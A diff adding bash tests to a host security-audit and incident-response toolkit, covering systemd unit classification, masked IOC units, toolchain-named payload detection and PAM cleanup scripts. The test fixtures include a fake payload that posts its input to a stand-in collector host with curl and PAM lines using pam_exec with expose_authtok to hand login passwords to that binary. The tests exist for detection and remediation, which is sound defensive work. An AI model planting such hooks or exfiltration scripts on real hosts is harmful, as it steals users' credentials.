@@ -1149,6 +1149,309 @@ test_triage() {
     check "the log points at the rollback for anything contained" "$?"
 }
 
+test_systemd_override() {
+
+    want "override" || return 0
+    printf '\nTEST: local override of a packaged unit\n'
+
+    setup_case override
+    mkdir -p "$CASE_DIR"/{etc,lib}
+    printf '[Unit]\nDescription=Tuning Daemon\n[Service]\nExecStart=/bin/true -l\n' > "$CASE_DIR/lib/tuned.service"
+    printf '[Unit]\nDescription=Tuning Daemon\n[Service]\nExecStart=/bin/true -l --custom\n' > "$CASE_DIR/etc/tuned.service"
+    printf '[Unit]\nDescription=x\n[Service]\nExecStart=/tmp/payload\n' > "$CASE_DIR/etc/evil.service"
+
+    local out
+    out="$(bash -c "
+        source '$REPO_DIR/lib/itm-audit-common.sh'
+        source '$REPO_DIR/lib/itm-web-common.sh'
+        ITM_CONF_DIR='$CASE_DIR/conf'; ITM_LOG_DIR='$CASE_DIR/log'
+        ITM_STATE_DIR='$CASE_DIR/state'; ITM_SCAN_STATE_DIR='$CASE_DIR/state/scan'
+        audit_load_config; audit_detect_os; audit_detect_host
+        ITM_DRY_RUN=1; audit_runtime_init
+        source '$REPO_DIR/modules/audit_systemd.sh'
+        is_pkg_owned() { [[ \"\$1\" == '$CASE_DIR/lib/tuned.service' ]]; }
+        pkg_owner() { printf 'tuned'; }
+        SYSTEMD_UNIT_DIRS='$CASE_DIR/etc $CASE_DIR/lib'
+        module_begin systemd 'Systemd'
+        check_unit_files
+        audit_runtime_cleanup" 2>&1)"
+
+    (( VERBOSE )) && printf '%s\n' "$out"
+
+    printf '%s' "$out" | grep -B1 'etc/tuned.service' | grep -qE '^\[LOW.*Local override'
+    check "a unit overriding a packaged one is LOW, not unknown persistence" "$?"
+
+    printf '%s' "$out" | grep -B1 'etc/evil.service' | grep -qE '^\[(HIGH|CRITICAL)'
+    check "a genuinely foreign unit is still HIGH/CRITICAL" "$?"
+
+    printf '%s' "$out" | grep -q 'Do NOT quarantine it without checking'
+    check "the override finding warns against quarantining it" "$?"
+}
+
+test_systemd_reasons() {
+
+    want "reasons" || return 0
+    printf '\nTEST: every actionable finding explains itself\n'
+
+    # A triage prompt showing "why : -" gives the operator nothing
+    # to judge by. This is what caused a legitimate service to be
+    # quarantined on a production host.
+    local missing
+    missing="$(awk '
+        /add_finding (CRITICAL|HIGH)/ {f=1; buf=""; id=""}
+        f {
+            buf = buf $0 "\n"
+            if ($0 ~ /id="/) { match($0, /id="[^"]*/); id = substr($0, RSTART+4, RLENGTH-4) }
+            if ($0 ~ /action=/) { f=0; if (buf !~ /reasons=/) print FILENAME ":" id }
+        }' "$REPO_DIR"/modules/audit_systemd.sh "$REPO_DIR"/modules/audit_ioc.sh)"
+
+    [[ -z "$missing" ]]
+    check "no CRITICAL/HIGH systemd or IOC finding is missing its reasons" "$?" "$missing"
+}
+
+test_notify_secret() {
+
+    want "secret" || return 0
+    printf '\nTEST: the Telegram token never reaches argv\n'
+
+    grep -q -- '--config -' "$REPO_DIR/bin/security-notify"
+    check "security-notify passes curl options on stdin" "$?"
+
+    ! grep -E '^curl' "$REPO_DIR/bin/security-notify" | grep -q 'BOT_TOKEN'
+    check "the token is not on the curl command line" "$?" \
+          "$(grep -E '^curl' "$REPO_DIR/bin/security-notify")"
+}
+
+# ------------------------------------------------------------
+# The generated PAM response script, executed for real.
+#
+# The older test re-implemented the sed commands inline, so it
+# proved the logic was right while the generated artefact was
+# still wrong: triage ran it, the script stopped at the console
+# gate, exited 0, and the malicious line stayed in the file while
+# DECISIONS.log recorded it as contained.
+#
+# Generate the real script and run it, both ways.
+# ------------------------------------------------------------
+# ------------------------------------------------------------
+# A masked systemd unit is a defence, not a threat.
+#
+# "systemctl mask" replaces the unit with a symlink to /dev/null
+# so it cannot be started. When the unit name is a known IOC, the
+# mask is usually what the responder did about it.
+#
+# Reporting that as a malicious artifact invites the one response
+# that makes things worse: quarantining the symlink UNMASKS the
+# unit and makes the implant startable again.
+# ------------------------------------------------------------
+# ------------------------------------------------------------
+# Both spellings of the toolchain-triplet payload.
+#
+# The first variant found was x86_65-linux-gnu-op, a typo of the
+# real triplet. The second spells x86_64 correctly and invents
+# only the tool suffix, which is far harder to spot by eye - and
+# a host was found carrying both at once.
+#
+# Neither may be dropped from the shipped list: an indicator is
+# only useful because every other host is checked against it.
+# ------------------------------------------------------------
+test_ioc_toolchain_variants() {
+
+    want "ioc-triplet" || return 0
+    printf '\nTEST: both toolchain-triplet payload spellings ship\n'
+
+    local conf="$REPO_DIR/config/known-iocs.conf.example" v
+    for v in x86_65-linux-gnu-op x86_64-linux-gnu-op; do
+        grep -qxF "path:/usr/bin/$v" "$conf"
+        check "$v is listed as a path indicator" "$?"
+        grep -qxF "filename:$v" "$conf"
+        check "$v is listed for the filename hunt" "$?"
+    done
+
+    # No real toolchain program is called "-op". If one ever ships,
+    # this list becomes a false positive on every build host.
+    ! ls /usr/bin/x86_64-linux-gnu-op >/dev/null 2>&1
+    check "no packaged binary uses the name (no false positive)" "$?"
+
+    setup_case ioc-triplet
+    mkdir -p "$CASE_DIR/bin"
+    printf '#!/bin/sh\ncurl -d "$1" http://collector.invalid/\n' \
+        > "$CASE_DIR/bin/x86_64-linux-gnu-op"
+    chmod 755 "$CASE_DIR/bin/x86_64-linux-gnu-op"
+
+    local out
+    out="$(
+        source "$REPO_DIR/lib/itm-audit-common.sh"
+        source "$REPO_DIR/lib/itm-web-common.sh"
+        audit_load_config; audit_detect_os; audit_detect_host
+        ITM_DRY_RUN=1; audit_runtime_init
+        source "$REPO_DIR/modules/audit_ioc.sh"
+        KNOWN_IOCS=("path:$CASE_DIR/bin/x86_64-linux-gnu-op")
+        module_begin ioc 'IOC'
+        ioc_check_known_paths
+        audit_runtime_cleanup
+    2>&1 )"
+
+    printf '%s' "$out" | grep -q 'x86_64-linux-gnu-op'
+    check "the correctly spelled variant is detected on disk" "$?"
+
+    printf '%s' "$out" | grep -qE '^\[(HIGH|CRITICAL)'
+    check "it is reported at HIGH or above" "$?"
+}
+
+test_ioc_masked_unit() {
+
+    want "ioc-mask" || return 0
+    printf '\nTEST: masked systemd unit is not treated as a payload\n'
+
+    setup_case ioc-mask
+
+    mkdir -p "$CASE_DIR/etc/systemd/system"
+    local masked="$CASE_DIR/etc/systemd/system/server-security.service"
+    local real="$CASE_DIR/etc/systemd/system/evil-payload.service"
+    ln -s /dev/null "$masked"
+    printf '[Service]\nExecStart=/usr/bin/defaults\n' > "$real"
+
+    local out
+    out="$(
+        source "$REPO_DIR/lib/itm-audit-common.sh"
+        source "$REPO_DIR/lib/itm-web-common.sh"
+        audit_load_config; audit_detect_os; audit_detect_host
+        ITM_DRY_RUN=1; audit_runtime_init
+        source "$REPO_DIR/modules/audit_ioc.sh"
+        KNOWN_IOCS=("path:$masked" "path:$real")
+        module_begin ioc 'IOC'
+        ioc_check_known_paths
+        audit_runtime_cleanup
+    2>&1 )"
+
+    printf '%s' "$out" | grep -q 'MASKED'
+    check "the mask is recognised and named in the title" "$?"
+
+    printf '%s' "$out" | grep -A8 'MASKED' | grep -q 'Do NOT quarantine'
+    check "the finding warns against quarantining the symlink" "$?"
+
+    ! printf '%s' "$out" | grep -B2 -A8 'MASKED' | grep -q 'the target is what executes'
+    check "the misleading generic symlink note is suppressed" "$?"
+
+    printf '%s' "$out" | grep -q '^\[LOW' 
+    check "a masked IOC unit is LOW, not HIGH" "$?"
+
+    # the unmasked file next to it must still be reported normally
+    printf '%s' "$out" | grep -q 'evil-payload.service'
+    check "a real unit file at an IOC path is still reported" "$?"
+
+    printf '%s' "$out" | grep -B4 'evil-payload' | grep -q 'ISOLATE THIS HOST' \
+        || printf '%s' "$out" | grep -A6 'evil-payload' | grep -q 'ISOLATE THIS HOST'
+    check "the real unit keeps the isolate-the-host action" "$?"
+}
+
+test_pam_remediation_script() {
+
+    want "pam-script" || return 0
+    printf '\nTEST: generated PAM response script\n'
+
+    setup_case pam-script
+
+    local pamfile="$CASE_DIR/password-auth"
+    printf 'auth\tsufficient\tpam_unix.so\nsession\trequired\tpam_unix.so\n#auth optional pam_exec.so quiet expose_authtok /usr/bin/x86_65-linux-gnu-op\n' \
+        > "$pamfile"
+
+    local script="$CASE_DIR/fix.sh" rc
+    (
+        source "$REPO_DIR/lib/itm-audit-common.sh"
+        source "$REPO_DIR/lib/itm-remediate.sh"
+        ITM_HOSTNAME="test-host"
+        REM_INCIDENT_DIR="$CASE_DIR/incident"
+        mkdir -p "$REM_INCIDENT_DIR"
+        : > "$script"
+        rem_header "$script" "Dormant pam_exec" "HIGH" "80" \
+            "$pamfile" "" "residue of a past compromise" "fp" "pam"
+        rem_template "$script" "pam-dormant-exec:$pamfile" "$pamfile" "" \
+            "Dormant pam_exec" "review"
+    ) >/dev/null 2>&1
+
+    bash -n "$script" 2>/dev/null && [[ "$(wc -l <"$script")" -gt 40 ]]
+    check "a complete script is generated, and it is valid bash" "$?"
+
+    # --- exactly how triage invokes it -----------------------
+    CONFIRM=yes FORCE=yes bash "$script" >/dev/null 2>&1; rc=$?
+
+    [[ "$rc" != "0" ]]
+    check "stopping at the console gate does not exit 0" "$?"
+
+    [[ "$rc" == "10" ]]
+    check "it exits 10, the code triage records as MANUAL" "$?"
+
+    grep -q 'pam_exec' "$pamfile"
+    check "the file is left untouched when the gate stops it" "$?"
+
+    # --- the operator supplies the missing precondition -------
+    CONFIRM=yes FORCE=yes CONSOLE_ACCESS=yes bash "$script" >/dev/null 2>&1; rc=$?
+
+    [[ "$rc" == "0" ]]
+    check "with CONSOLE_ACCESS=yes the script completes" "$?"
+
+    ! grep -q 'pam_exec' "$pamfile"
+    check "the dormant line is actually removed" "$?"
+
+    grep -q 'pam_unix.so' "$pamfile"
+    check "every other PAM line survives" "$?"
+
+    [[ -f "$CASE_DIR/incident/evidence/password-auth.before" ]]
+    check "the original file is preserved as evidence" "$?"
+
+    grep -q 'pam_exec' "$CASE_DIR/incident/evidence/password-auth.before" 2>/dev/null
+    check "the preserved copy still contains the removed line" "$?"
+
+    [[ ! -f "$CASE_DIR/incident/quarantine/$(printf '%s' "${pamfile//\//_}")" ]]
+    check "the PAM file itself is never moved to quarantine" "$?"
+}
+
+test_pam_remediation_edit() {
+
+    want "pam-edit" || return 0
+    printf '\nTEST: PAM remediation edits the right line\n'
+
+    setup_case pam-edit
+
+    # The two states a pam_exec hook can be in. Getting these
+    # wrong means either doing nothing (dormant line untouched)
+    # or breaking authentication (deleting a live line).
+    printf 'auth\trequired\tpam_env.so\n#auth optional pam_exec.so quiet expose_authtok /usr/bin/gone\nauth\tsufficient\tpam_unix.so\n' \
+        > "$CASE_DIR/dormant"
+    printf 'auth\trequired\tpam_env.so\nauth optional pam_exec.so expose_authtok /usr/bin/evil\nauth\tsufficient\tpam_unix.so\n' \
+        > "$CASE_DIR/active"
+
+    local f
+    for f in dormant active; do
+        if grep -qE "^[^#]*pam_exec\.so" -- "$CASE_DIR/$f"; then
+            sed -i "s|^\(  *\)\{0,1\}\([^#].*pam_exec\.so.*\)\$|# ITM-DISABLED \2|" -- "$CASE_DIR/$f"
+        else
+            sed -i "/^[[:space:]]*#.*pam_exec\.so/d" -- "$CASE_DIR/$f"
+        fi
+    done
+
+    ! grep -q 'pam_exec' "$CASE_DIR/dormant"
+    check "a dormant (commented) pam_exec line is removed" "$?"
+
+    grep -q 'ITM-DISABLED' "$CASE_DIR/active"
+    check "an active pam_exec line is commented out, not deleted" "$?"
+
+    grep -q 'pam_unix.so' "$CASE_DIR/dormant" && grep -q 'pam_unix.so' "$CASE_DIR/active"
+    check "the rest of the PAM stack is left intact in both cases" "$?"
+
+    grep -q 'pam_env.so' "$CASE_DIR/active"
+    check "no other module line is disturbed" "$?"
+
+    # the generator must contain both branches
+    grep -q 'removing DORMANT' "$REPO_DIR/lib/itm-remediate.sh"
+    check "the generated script handles the dormant case at all" "$?"
+
+    grep -q 'CONSOLE_ACCESS' "$REPO_DIR/lib/itm-remediate.sh"
+    check "PAM edits still require console access to be confirmed" "$?"
+}
+
 test_health() {
 
     want "health" || return 0
@@ -1272,6 +1575,13 @@ test_non_web_host
 test_safety_invariants
 test_remediation
 test_triage
+test_pam_remediation_edit
+test_pam_remediation_script
+test_ioc_masked_unit
+test_ioc_toolchain_variants
+test_systemd_override
+test_systemd_reasons
+test_notify_secret
 test_health
 test_cron
 test_self_protection
